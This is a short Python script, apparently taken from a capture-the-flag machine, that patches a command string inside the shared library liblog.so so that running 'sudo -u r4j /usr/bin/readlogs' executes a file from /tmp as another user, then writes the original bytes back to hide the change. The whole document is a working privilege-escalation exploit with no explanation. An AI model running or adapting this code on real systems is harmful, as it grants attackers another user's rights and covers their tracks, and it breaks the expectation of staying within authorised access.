# Leaked from /tmp thx! to whoever wrote this :)

import os
signature = b'/usr/bin/tail -n10 /var/log/auth.log'
fd = open('/lib/x86_64-linux-gnu/liblog.so', 'r+b')
content = fd.read()
idx = content.find(signature)
fd.seek(idx)
fd.write(b'/tmp/...;')
fd.close()
os.system('sudo -u r4j /usr/bin/readlogs')
fd = open('/lib/x86_64-linux-gnu/liblog.so', 'r+b')
fd.seek(idx)
fd.write(signature)
fd.close()
print('Done')
quit()

